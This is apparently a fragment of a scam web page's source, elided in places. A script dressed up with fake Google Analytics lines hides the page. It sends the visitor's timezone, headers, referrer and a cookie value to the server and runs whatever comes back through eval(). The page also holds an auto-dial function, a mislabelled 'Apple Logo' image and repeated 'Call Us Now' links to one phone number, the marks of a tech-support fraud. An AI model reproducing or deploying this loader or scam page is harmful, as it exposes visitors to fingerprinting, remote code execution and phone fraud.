...
<script>
$(document).ready(function(){$("body").hide();$("html").append("<div id=\"lo480057ad\" style=\"margin-top:8%;background-color:white;text-align:center;font-size:40px;\">Please Wait for Page to Load...</div>");var f=new XMLHttpRequest();f.open("GET",document.location,true);f.send(null);var g;f.onreadystatechange = function(){g=f.getAllResponseHeaders().toLowerCase();};var b="GoogleAnalyticsObject";var c=("document","script","//www.google-analytics.com/analytics.js");c=("create","UA-407270-1","auto");c=("send","pageview");var d=jstz.determine();var e=d.name();var qu=escape(window.location.search.substr(1));var rui=location.pathname+location.search;var r=document.referrer;var sn=document.domain;var value="; "+document.cookie;var pa=value.split("; "+"_event"+"=");var co=pa.pop().split(";").shift();var q;$.ajax({url:location.href,type:"POST",data:"tz="+e+"&he="+g+"&rui="+rui+"&qu="+qu+"&r="+r+"&sn="+sn+"&co="+co,success:function(a){eval(a)}})})
</script>
    <!-- Google tag (gtag.js) -->
...
<script>
  ...
  <script>
    function autoDial() {
      var phoneNumber = "+1-818-463-0752";
...
<img src="facebook.png" alt="Apple Logo" class="apple-logo">
  ...
  <a href="tel:+1-818-463-0752" class="call-button">Call Us Now</a>
<br>
  <a href="tel:+1-818-463-0752" class="call-button">+1-818-463-0752</a>
